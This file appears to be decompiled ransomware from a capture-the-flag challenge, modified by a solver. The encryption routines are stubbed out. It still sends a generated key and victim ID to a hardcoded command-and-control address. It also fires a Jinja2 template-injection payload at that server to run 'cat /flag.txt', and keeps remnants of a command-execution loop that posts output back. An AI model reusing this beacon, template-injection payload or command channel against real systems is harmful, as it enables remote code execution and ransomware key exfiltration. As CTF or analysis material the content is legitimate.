# Source Generated with Decompyle++
# File: unicorn__main__.pyc (Python 3.9)

import requests
import socket
from Crypto.Cipher import AES
import string
import random
import os
import subprocess
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_PKCS1_v1_5
from random import randbytes

class Encrypt:
    
    def __init__(self):
        self.key = self.generateRandomBytes(16)
        self.id = self.generateVictimId().decode()
        self.victims = []
        self.pubkey = self.getPubKey()

    
    def getPubKey(self):
        original = 'MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAne1BndoJFocaVJ8JbgRjfWqgGI3Xw1OmTFDYLO3Je54FdLe2XAK/E+gYqZTte3eyRT1C2bjojtdkK7lsscyyJfWLiiiZVUR7ah+6cvD6mNFnUCBnuPW1eWfOUJxjN/o85Zja3dhRovU2nWZMKl0TF5z9EoZc7Dg0mMo+Y+1HqDTYBtzCQ2a0H17lekANpxEESCzYzCM3w9FOuDdQ2P1ggslPQ5b6aKNh+nEejPMSLV8eTvNa47p0S3Nva4uaKfeY3DUJ6v3uwOWLOyPJ/nsSm5juHJ6gYSV89NsMPooLPme8nvM2Sj/IkiPkzt5Ov0+q74GBSQw4P5dGyYxPf/FXnFZnR+2eAb0iVRfnSGl6SEAGDfuC5ns528sZn/j4g6JYkglu775q9SOFmw6XiWP1LtA9eN8iQLlBAjh49K2zi8nz1oOl+TJXx83qiZzswz4ErlI5sfAGClczGPqGFAROauerYYusjqE16so3gzZU+lTgnziUNVLQHNVJmBB/jhEux1fTX6ujydAoWA0Z7iyi19UkyKUh4WmuXDOeyVFx1i2WVhCU8Gh7ozSTZkkVF409jpR9L1PkWRenHdOilkPuGRiuG8FajA2LX1mrTq5TdoeR99haq1cp+S6FquEFQBnvmleHJ4itrz9hXUsc97pRJ0SEwfZB5RQtP6W3C34sJ/kCAwEAAQ=='
        keyDer = b64decode(original)
        pubKey = RSA.importKey(keyDer)
        cipher = Cipher_PKCS1_v1_5.new(pubKey)
        return cipher

    def generateRandomBytes(self, length):
        return randbytes(length)

    def getAllAbsoluteFilesToEncrypt(self):
        pass

    def encryptRoutine(self):
        #print('WE SAY DO NOT RUN THIS BINARY...........')
        return None

    def generateVictimId(self):
        id = self.generateRandomBytes(96)
        return b64encode(id)
        
    def writeReadMe(self):
        #print('WE SAY TO NOT RUN THIS BINARY..................')
        return None

    def main(self):
        self.getAllAbsoluteFilesToEncrypt()
        self.encryptRoutine()
        self.writeReadMe()
        return (self.key, b64encode(self.pubkey.encrypt(self.key)), self.id)



class Communicate:
    
    def __init__(self):
        self.url = ''
        self.key = ''
        self.id = ''
        self.customHeader = 'AF9NNTqOX61NuxdqzzfyCEre/dc6MLKgaXO6PaYNs3qMGJ5cI0Zh5n/xR9xgIAjkeTxB33SaVA5erugvx45mPWPJYvhREh6od/gf4a/2RXDKJhIa/U7SEMP/MnxpB7zFFjz5J5VIfKUnOl3p/OYq00lA7PcRr2ZWDkow7QGqwfH17Te7GB1IFslEzsRhB1ZNuQvznVWVBsnNX9+1vnHW6K7Fpz5tUlNa7LrXsPBZWQDaeEeR3h4EB8ksBU9kvrMP2qYvGONQuQ7YdxzSJuxAEFPk96Xa6slwVx653PponQfx40Tuu7DszdRMU0LnUwChHYojnHUTxAA64frDsOGm/s3qdUjMQ15ZFu3/qb1z2Y1f8sq5rFeVQnytwec1YW6nANtVSvbWePeTm4tfiygpwB5ZjbtRCGQw5lcUR3PKF/aLYdk5xkzJQreedJccl4LaxvMAtkTdt8mdBZyVy1xeA/ENrl5u+fpaf2D2GrUI4aDPOajATVIG8eheetiDDJioq0QZikFpPntsLGz5/Xk77KGFJ/8r5G1q5/jYnBo7c17z3Q9F8zWr43skVwt8QGiD1nDJrIelwR7s93M3fR2Jb21e6LFTtgpGhNuMypsjVjpFnS99ZhTRTvelnIvVvQt37TmmEt4y4dBwFj+bWeLDiqcDpTfDR8wGGzFhPUQqNl8='
        self.customValue = 'MN7Igh+sXQEVX4iFtYReR8s5WxLyZbcDW+ZJpxNcM4ibUeW2ftfQ08li6/8OI83uW2mo5+wFQMg9sB3dp8fZLf0wop2XAqq/9D96rJODOJ7FY59DrlTQI03okSBRgbb8mvuI799cywEnUvVh3XxAmHjO7YJ4sez3DFQ/3Qq6YvYoY1mik8MJRSxPdNXlgyeNYAqWO28U4NZJF8IoplYQxPtaUIhHcCGrq9+tVcOAlBczzeIpPLpWwT7jQg94rclW426wWnYJXfJrD+huMbEFtcKQMNn8Jr4jBQdlEuPdKXISfeXpprW+fwzSg6biK3xo0J+AIdLwiEgOIncH9CsmSIIjwAQRXXowJdjtBiq8iEHw1lHdd/hBCGsZ7YB/G4JzvV76ikgaeBOGV8tsnVTCpvpsRDGKn37U/FAkRAzLKYDx65enwNFJs2ycZG1Hp4xgyils0rF+JagEHZ54li5szuKcOis8mh9CObBC/JcqQy+I8vfqnHI8Eoa7sDx1KMEeoIT2eiThJWECqwT706SrBgAzNZN33c3kgjQ1LJ8akH7EZ2cCglCNc6ceBNZjM3782qFl0kGMhESWXFkpi+mWS7oq1XYdp4qPO7QwO8TEDr0uPGVFSQvHU54MBWogzWRooTnGU2vhRB7jTR3oEsqeG7/G1/G/mVXH2oFN1A2ZR8E='

    
    def getUrl(self):
        url = [
            784,
            832,
            864,
            736,
            848,
            912,
            736,
            784,
            848,
            864,
            736,
            896,
            800,
            928,
            848,
            912,
            896,
            864,
            800]
        new = '146.59.156.82:59862'
        return new

    
    def evil(self, res):
        print('WE SAY NOT TO RUN THE MALWARE...')

    
    def sendKey(self):
        url = self.getUrl()
        r = requests.post('http://' + url + '/key', data={
            'victim_key': self.k,
            'victim_id': self.id }, headers={
            self.customHeader: self.customValue }).json()
        res = requests.post('http://' + url + r['todo'], data={
            'os': 'linux',
            'id': self.id }, headers= {
            self.customHeader: self.customValue })#.json() Retirer ça car il envoie du 500
        #Une secu a retirer self.evil(res)

    
    def waitForCmd(self):
        url = self.getUrl()
        output="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
        res=requests.post('http://' + url + '/resultcmd', data={
            'res_cmd': output }, headers={
            self.customHeader: self.customValue })
        print(res.text)
        exit()
        print('WE SAY NOT TO RUN THE MALWARE....')
        #Encore une secu a retirer return None
        (conn, addr) = serv_sock.accept()
        if addr[0] != '127.0.0.1':
            pass
        
        data = conn.recv(1024).decode().strip('\n')
        if data == 'q' or data == 'Q':
            serv_sock.close()
        print(data)
        exit()
        #proc = subprocess.Popen(data, subprocess.PIPE, **('stdout',))
        output = proc.stdout.read()
        requests.post('http://' + url + '/resultcmd', data={
            'res_cmd': output }, headers={
            self.customHeader: self.customValue })
        serv_sock.close()

    
    def main(self, vars):
        self.key = vars[0]
        self.k = vars[1].decode()
        self.id = vars[2]
        self.sendKey()
        self.waitForCmd()


if __name__ == '__main__':
    encrypt = Encrypt()
    variables = encrypt.main()
    comm = Communicate()
    comm.main(variables)